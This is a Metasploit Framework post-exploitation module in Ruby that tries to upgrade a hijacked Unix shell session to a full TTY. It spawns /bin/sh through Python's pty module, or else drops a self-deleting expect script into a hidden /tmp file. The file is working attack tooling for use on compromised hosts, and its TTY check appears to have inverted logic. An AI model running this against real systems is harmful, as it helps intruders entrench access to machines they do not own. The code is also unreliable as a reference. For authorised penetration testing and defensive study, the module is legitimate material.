# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	include Msf::Post::Common



	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Multiple Linux / Unix Post TTY Shell',
				'Description'   => %q{
					This module attempts to acquire a TTY via python or expect.
				},
				'License'       => MSF_LICENSE,
				'Author'        => ['RageLtMan <rageltman[at]sempervictus>'],
				'Platform'      => [ 'linux','unix','osx','solaris','aix' ],
				'References'    =>
					[
						[ 'URL', 'http://pentestmonkey.net/blog/post-exploitation-without-a-tty']
					],
				'SessionTypes'  => [ 'shell' ] # Causes Linux Meterpreter to crash, so does rain.
			))
	end

	def run
		# Error checking the results of a TTY shell attempt is tricky.
		# After the TTY is acquired, cmd_exec no longer until the next run
		if have_tty?
			print_good("Already have TTY")
			return
		end
		if check_python?
			# First choice since it's in-memory
			vprint_good("Using Python method")
			# Given that the python binary keeps running we get no output.
			cmd_exec("python -c \"import pty; pty.spawn('/bin/sh')\"", nil, 1)
		elsif check_expect?
			# This drops a file to disk so less preferable
			vprint_good("Using expect method")
			expect_tty
		else
			print_error("No suitable TTY shell methods were found")
			return
		end
	end

	# Needs testing on more platforms.
	def have_tty?
		return cmd_exec("tty").empty?
	end

	def check_python?
		if !cmd_exec("which python").empty? and
			cmd_exec("python -c \"import pty; print 'HAVE_PTY'\"") == 'HAVE_PTY'
			return true
		else
			return false
		end
	end

	def check_expect?
		!cmd_exec("which expect").empty?
	end

	def expect_tty
		expect_sh = "/tmp/." + Rex::Text.rand_text_alpha(7)
		begin
			# Based on the sudo post module's askpass_sudo method
			# Expect shell from pentestmonkey, with self cleanup addition
			vprint_status "Writing the expect script: #{expect_sh}"
			cmd_exec("echo \\#\\!/usr/bin/expect > #{expect_sh}")
			cmd_exec("echo \"spawn rm #{expect_sh}\" >> #{expect_sh}")
			cmd_exec("echo \"spawn sh\" >> #{expect_sh}")
			cmd_exec("echo interact >> #{expect_sh}") 
			cmd_exec("expect #{expect_sh}",nil,1)
		rescue
			print_error "Unable to get expect TTY shell"
			cmd_exec("rm #{expect_sh}")
		end
	end


end
